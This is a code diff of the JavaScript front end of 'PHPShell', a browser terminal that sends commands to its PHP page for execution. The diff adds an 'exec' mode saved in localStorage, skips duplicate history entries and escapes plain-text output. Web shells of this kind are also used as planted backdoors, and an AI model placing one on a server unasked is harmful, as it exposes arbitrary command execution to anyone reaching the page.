@@ -5,18 +5,18 @@ var PHPShell = {};
 
         var input = '';
         var history = [];
-        
+
         try {
           history = JSON.parse(localStorage.getItem('hist')) || [];
         } catch(e){}
-        
+
         var currentHistory = 0;
         var $pre = $('<pre>');
         $('body > *').each(function(){
           $(this).remove();
         });
-        var mode = 'interactive';
-        var supportedModes = ['interactive','shell_exec'];
+        var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';
+        var supportedModes = ['interactive','shell_exec','exec'];
 
         var onCommandListeners = [];
 
@@ -187,8 +187,6 @@ var PHPShell = {};
 
         function readProc(){
             $.post(window.location.href,{action:'proc',handle:currentHandle,cwd:SHELL_INFO.cwd}, function(response){
-
-
                 if(response.out !== "")
                     write(response.out);
 
@@ -201,7 +199,7 @@ var PHPShell = {};
 
                 animateCursor();
             },"json").error(function(){
-                    readProc();
+                readProc();
             });
         }
 
@@ -221,8 +219,10 @@ var PHPShell = {};
 
         function runStatement(){
             var statement = $input.val();
-            history.push(statement);
-            localStorage.setItem('hist', JSON.stringify(history));
+            if(history[history.length-1] !== statement){
+              history.push(statement);
+              localStorage.setItem('hist', JSON.stringify(history));
+            }
             currentHistory = 0;
             $input.val('');
             writeln(statement);
@@ -261,8 +261,10 @@ var PHPShell = {};
                 if($.inArray(setMode[1],supportedModes) > -1){
                     mode = setMode[1];
                     writeln('PHPShell mode set to '+mode);
+                    localStorage.setItem('ps_xmode', mode);
                 } else {
-                    writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', '));
+                    writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
+                    + "\nCurrent mode: "+mode);
                 }
                 writeCwdLine();
                 return;
@@ -287,9 +289,8 @@ var PHPShell = {};
                     currentHandle = response.handle;
                     procStdIn = [];
                     readProc();
-                    console.log('1');
                 } else {
-                    write(response.output);
+                    write(response.html ? response.output : document.createTextNode(response.output));
                     SHELL_INFO.cwd = response.cwd;
                     writeCwdLine();
                     animateCursor();
